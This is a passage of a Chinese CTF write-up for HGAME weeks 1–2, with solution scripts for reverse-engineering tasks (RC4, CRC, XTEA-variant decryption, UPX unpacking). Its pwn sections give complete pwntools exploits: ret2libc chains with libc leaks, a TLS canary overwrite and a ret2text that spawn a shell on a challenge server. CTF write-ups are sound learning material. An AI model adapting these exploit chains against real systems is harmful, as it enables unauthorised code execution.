</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>RC4 + Base64</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> ARC4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> b64decode(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;carol&#39;</span>
</span></span><span style="display:flex;"><span>rc4 <span style="color:#f92672">=</span> ARC4<span style="color:#f92672">.</span>new(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rc4<span style="color:#f92672">.</span>decrypt(cipher)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># b&#39;hgame{weLC0ME_To-tHE_WORLD_oF-AnDr0|D}&#39;</span>
</span></span></code></pre></div><h3 id="re猫头鹰是不是猫">[RE]猫头鹰是不是猫</h3>
<p>做了两次矩阵乘法，求解方法是先把两个常数矩阵乘起来，然后用 z3 求解</p>
<h3 id="pwnenter_the_pwn_land">[Pwn]enter_the_pwn_land</h3>
<p>经典 ret2libc</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chuj.top&#34;</span>, <span style="color:#ae81ff">34671</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process(b&#39;./a.out&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401313</span>
</span></span><span style="display:flex;"><span>pop_rsi_r15_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401311</span>
</span></span><span style="display:flex;"><span>puts_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404020</span>
</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401090</span>
</span></span><span style="display:flex;"><span>test_thread <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011B6</span>
</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401260</span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40101a</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pre_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x30</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x4</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x2c</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> pre_payload <span style="color:#f92672">+</span> p64(pop_rdi_ret) <span style="color:#f92672">+</span> p64(puts_got) <span style="color:#f92672">+</span> p64(puts_plt) <span style="color:#f92672">+</span> p64(main)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>puts_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>print (hex(puts_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>puts_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x875A0</span>
</span></span><span style="display:flex;"><span>binsh_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1B75AA</span>
</span></span><span style="display:flex;"><span>system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x55410</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc_addr <span style="color:#f92672">=</span> puts_addr <span style="color:#f92672">-</span> puts_offset
</span></span><span style="display:flex;"><span>binsh_addr <span style="color:#f92672">=</span> libc_addr <span style="color:#f92672">+</span> binsh_offset
</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> libc_addr <span style="color:#f92672">+</span> system_offset
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> pre_payload <span style="color:#f92672">+</span> p64(ret) <span style="color:#f92672">+</span> p64(pop_rdi_ret) <span style="color:#f92672">+</span> p64(binsh_addr) <span style="color:#f92672">+</span> p64(system_addr)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h3 id="pwnenter_the_evil_pwn_land">[Pwn]enter_the_evil_pwn_land</h3>
<p>这道题目的难点在于 Canary 的绕过，用到了一个 ptrace 的特性，Canary 存储在 TLS 中，ptrace 时 TLS 距离栈较近，所以只需要疯狂往后覆盖就行，我这里覆盖了 0x900 位</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chuj.top&#34;</span>, <span style="color:#ae81ff">35131</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process(&#39;./a.out&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401363</span>
</span></span><span style="display:flex;"><span>pop_rsi_r15_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401361</span>
</span></span><span style="display:flex;"><span>puts_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404020</span>
</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4010A0</span>
</span></span><span style="display:flex;"><span>test_thread <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011D6</span>
</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4012A3</span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40101a</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(p, &#39;thread 2\nb *0x401245&#39;)</span>
</span></span><span style="display:flex;"><span>pre_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p64(pop_rdi_ret) <span style="color:#f92672">+</span> p64(puts_got) <span style="color:#f92672">+</span> p64(puts_plt) <span style="color:#f92672">+</span> p64(test_thread)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(pre_payload <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x900</span>)
</span></span><span style="display:flex;"><span>print (p<span style="color:#f92672">.</span>recvline())
</span></span><span style="display:flex;"><span>puts_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>puts_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x875A0</span>
</span></span><span style="display:flex;"><span>binsh_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1B75AA</span>
</span></span><span style="display:flex;"><span>execv_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xE6450</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc_addr <span style="color:#f92672">=</span> puts_addr <span style="color:#f92672">-</span> puts_offset
</span></span><span style="display:flex;"><span>binsh_addr <span style="color:#f92672">=</span> libc_addr <span style="color:#f92672">+</span> binsh_offset
</span></span><span style="display:flex;"><span>execv_addr <span style="color:#f92672">=</span> libc_addr <span style="color:#f92672">+</span> execv_offset
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p64(ret) <span style="color:#f92672">+</span> p64(pop_rdi_ret) <span style="color:#f92672">+</span> p64(binsh_addr) <span style="color:#f92672">+</span> p64(pop_rsi_r15_ret) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(execv_addr)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(pre_payload <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x900</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><blockquote>
<p>此外，这题还学到了 gdb 调试 threads 的技巧
<code>info threads</code> 可以查看当前的线程，<code>thread i</code> 可以切换到第 i 个线程</p>
</blockquote>
<h3 id="pwntest_your_gdb">[Pwn]test_your_gdb</h3>
<p>先调试拿到 password，然后就是简单的 ret2text 了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process(b&#39;./a.out&#39;)</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chuj.top&#34;</span>, <span style="color:#ae81ff">50748</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x47\xf1\x94\x82\x0e\x1e\x36\xb0\xa9\xa6\xd8\x4e\xc3\xe0\x09\x8c</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(p)</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pass word</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0x18</span>)
</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> canary <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x401256</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="week2">Week2</h2>
<h3 id="rexd-maze">[RE]xD MAZE</h3>
<p>一维的迷宫，直接用 vscode 的小技巧转成 flag</p>
<p>选中 512 个 <code>#</code> 和后面的一个空格，然后 <code>CTRL+SHIFT+L</code> 全选，换成 <code>3</code>，以此类推</p>
<h3 id="reupx-magic-0">[RE]upx magic 0</h3>
<p>把所有可见字符都算一遍，然后映射回去就行</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crc</span>(x):
</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">&lt;&lt;=</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> x <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x8000</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            x <span style="color:#f92672">=</span> (x <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x1021</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            x <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>        x <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xffff</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> x
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x80</span>):
</span></span><span style="display:flex;"><span>    a<span style="color:#f92672">.</span>append(crc(i))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x8D68</span>, <span style="color:#ae81ff">0x9D49</span>, <span style="color:#ae81ff">0x2A12</span>, <span style="color:#ae81ff">0xAB1A</span>, <span style="color:#ae81ff">0xCBDC</span>, <span style="color:#ae81ff">0xB92B</span>, <span style="color:#ae81ff">0x2E32</span>, <span style="color:#ae81ff">0x9F59</span>, 
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xDDCD</span>, <span style="color:#ae81ff">0x9D49</span>, <span style="color:#ae81ff">0xA90A</span>, <span style="color:#ae81ff">0xE70</span>, <span style="color:#ae81ff">0xF5CF</span>, <span style="color:#ae81ff">0xA50</span>, <span style="color:#ae81ff">0x5AF5</span>, <span style="color:#ae81ff">0xFF9F</span>, 
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x9F59</span>, <span style="color:#ae81ff">0xBD0B</span>, <span style="color:#ae81ff">0x58E5</span>, <span style="color:#ae81ff">0x3823</span>, <span style="color:#ae81ff">0xBF1B</span>, <span style="color:#ae81ff">0x78A7</span>, <span style="color:#ae81ff">0xAB1A</span>, <span style="color:#ae81ff">0x48C4</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xA90A</span>, <span style="color:#ae81ff">0x2C22</span>, <span style="color:#ae81ff">0x9F59</span>, <span style="color:#ae81ff">0x5CC5</span>, <span style="color:#ae81ff">0x5ED5</span>, <span style="color:#ae81ff">0x78A7</span>, <span style="color:#ae81ff">0x2672</span>, <span style="color:#ae81ff">0x5695</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> cipher:
</span></span><span style="display:flex;"><span>    print (chr(a<span style="color:#f92672">.</span>index(c)), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># noW_YOu~koNw-UPx~mAG|C_@Nd~crC16</span>
</span></span></code></pre></div><h3 id="reupx-magic-1">[RE]upx magic 1</h3>
<p>发现没法自动脱壳，010 打开之后，手动把三个 <code>UPX?</code> 改成 <code>UPX!</code>，之后就能自动脱壳了</p>
<h3 id="refake-shell">[RE]fake shell</h3>
<p>RC4 + init 更换密钥</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>target <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xB6</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0xFA</span>, <span style="color:#ae81ff">0x8F</span>, <span style="color:#ae81ff">0x3D</span>, <span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0xB2</span>, <span style="color:#ae81ff">0xE0</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xEA</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">0xD2</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0x6C</span>, <span style="color:#ae81ff">0x9D</span>, <span style="color:#ae81ff">0xE7</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0xC5</span>, <span style="color:#ae81ff">0xBE</span>, <span style="color:#ae81ff">0x6F</span>, <span style="color:#ae81ff">0x6D</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x7C</span>, <span style="color:#ae81ff">0x7B</span>, <span style="color:#ae81ff">0x09</span>, <span style="color:#ae81ff">0x8D</span>, <span style="color:#ae81ff">0xA8</span>, <span style="color:#ae81ff">0xBD</span>, <span style="color:#ae81ff">0xF3</span>, <span style="color:#ae81ff">0xF6</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> ARC4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rc4 <span style="color:#f92672">=</span> ARC4<span style="color:#f92672">.</span>new(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;w0wy0ugot1t&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rc4<span style="color:#f92672">.</span>decrypt(bytes(target))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># b&#39;hgame{s0meth1ng_run_bef0r_m4in?}&#39;</span>
</span></span></code></pre></div><p>或者直接动调也行</p>
<h3 id="recreakme2">[RE]creakme2</h3>
<p>在加密函数里看一下汇编，发现用了 try except 来构造了一个除 0 异常，当最高位为 0 时，异或一个 0x1234567</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">encipher</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> num_rounds, <span style="color:#66d9ef">uint32_t</span> v[<span style="color:#ae81ff">2</span>], <span style="color:#66d9ef">uint32_t</span> <span style="color:#66d9ef">const</span> key[<span style="color:#ae81ff">4</span>]) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> v0<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">0</span>], v1<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">1</span>], sum<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, delta<span style="color:#f92672">=</span><span style="color:#ae81ff">0x9E3779B1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> num_rounds; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        v0 <span style="color:#f92672">+=</span> (((v1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v1) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[sum <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>]);
</span></span><span style="display:flex;"><span>        sum <span style="color:#f92672">+=</span> delta;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (sum <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">31</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>            sum <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x1234567</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, sum);
</span></span><span style="display:flex;"><span>        v1 <span style="color:#f92672">+=</span> (((v0 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v0 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v0) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[(sum<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">11</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    v[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>v0; v[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>v1;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, sum);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">decipher</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> num_rounds, <span style="color:#66d9ef">uint32_t</span> v[<span style="color:#ae81ff">2</span>], <span style="color:#66d9ef">uint32_t</span> <span style="color:#66d9ef">const</span> key[<span style="color:#ae81ff">4</span>]) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> v0<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">0</span>], v1<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">1</span>], delta<span style="color:#f92672">=</span><span style="color:#ae81ff">0x9E3779B1</span>, sum<span style="color:#f92672">=</span><span style="color:#ae81ff">0xc78e4d05</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> num_rounds; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        v1 <span style="color:#f92672">-=</span> (((v0 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v0 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v0) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[(sum<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">11</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (sum <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">31</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>            sum <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x1234567</span>;
</span></span><span style="display:flex;"><span>        sum <span style="color:#f92672">-=</span> delta;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, sum);
</span></span><span style="display:flex;"><span>        v0 <span style="color:#f92672">-=</span> (((v1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v1) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[sum <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    v[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>v0; v[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>v1;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
